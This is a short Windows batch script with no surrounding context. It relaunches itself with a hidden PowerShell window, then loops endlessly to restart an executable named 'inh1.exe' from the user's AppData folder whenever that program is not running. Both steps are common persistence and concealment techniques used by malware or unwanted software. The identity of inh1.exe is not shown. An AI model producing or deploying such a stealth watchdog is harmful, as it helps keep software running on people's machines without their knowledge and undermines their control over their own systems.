@echo off

:: === 1. Relaunch self hidden if not already ===
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: === 2. Loop to keep inh1.exe running silently ===
:l
tasklist /fi "imagename eq inh1.exe" | find /i "inh1.exe" >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    start "" "%USERPROFILE%\AppData\inh1.exe"
)
goto l
